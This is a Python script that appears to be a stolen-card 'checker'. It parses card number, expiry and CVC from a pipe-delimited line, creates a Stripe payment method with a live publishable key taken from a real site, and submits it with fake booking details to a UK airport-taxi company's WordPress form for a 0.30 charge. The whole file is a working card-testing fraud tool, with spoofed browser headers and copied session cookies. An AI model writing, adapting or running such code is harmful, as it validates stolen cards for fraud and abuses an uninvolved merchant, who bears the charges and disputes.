import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F7802eaa3b7%3B+stripe-js-v3%2F7802eaa3b7%3B+card-element&key=pk_live_51MoBwUEyPxtqFH7k8oANeArm71nH5ylFlj1u3NMxQJzDpoCuOV4IMpo1I5mZLYgfb39AhRfOFTSymwA0s6DpWoBL00E6SATjS1'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_tccl_visitor': 'cc19373a-8da7-4e8a-a283-4b4dd66d1d10',
	    '_tccl_visit': 'cc19373a-8da7-4e8a-a283-4b4dd66d1d10',
	    '_scc_session': 'pc=1&C_TOUCH=2025-02-28T05:06:59.619Z',
	    '_ga': 'GA1.1.116612119.1740719221',
	    '__stripe_mid': '53bef69b-0e79-45d6-84c6-0fb84c9d985693efba',
	    '__stripe_sid': 'f9a0bbd2-d6da-4303-82b3-482941b5d25cd2a142',
	    'fluentform_step_form_hash_9': 'aa9a5bb6-6974-42ae-9576-9f0ef270cf74',
	    '_ga_3YNC9FGKV1': 'GS1.1.1740719220.1.1.1740719293.0.0.0',
	}
	
	headers = {
	    'authority': 'cheapairporttaxi.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_tccl_visitor=cc19373a-8da7-4e8a-a283-4b4dd66d1d10; _tccl_visit=cc19373a-8da7-4e8a-a283-4b4dd66d1d10; _scc_session=pc=1&C_TOUCH=2025-02-28T05:06:59.619Z; _ga=GA1.1.116612119.1740719221; __stripe_mid=53bef69b-0e79-45d6-84c6-0fb84c9d985693efba; __stripe_sid=f9a0bbd2-d6da-4303-82b3-482941b5d25cd2a142; fluentform_step_form_hash_9=aa9a5bb6-6974-42ae-9576-9f0ef270cf74; _ga_3YNC9FGKV1=GS1.1.1740719220.1.1.1740719293.0.0.0',
	    'origin': 'https://cheapairporttaxi.co.uk',
	    'referer': 'https://cheapairporttaxi.co.uk/book-now/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1740719294547',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D549%26_fluentform_9_fluentformnonce%3Dfb4c882101%26_wp_http_referer%3D%252Fbook-now%252F%26input_radio%3DSaloon%2520(4%2520Passengers%252C%2520%25202X%2520Big%2520%2526%25202X%2520Small%2520Bags)%26input_radio_1%3DAirport%26dropdown_4%3DLondon%2520City%2520Airport%26dropdown_10%3DWitney%26numeric_field7%3D180%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser20%2540gmail.com%26phone%3D0817480671%26input_text_1%3DStreet%252027%26input_text_2%3D1%26datetime_2%3D2025-02-28%26datetime_3%3D14%253A07%26custom-payment-amount%3D0.30%26payment_method_1%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=9'
	
	r2 = requests.post(
	    'https://cheapairporttaxi.co.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
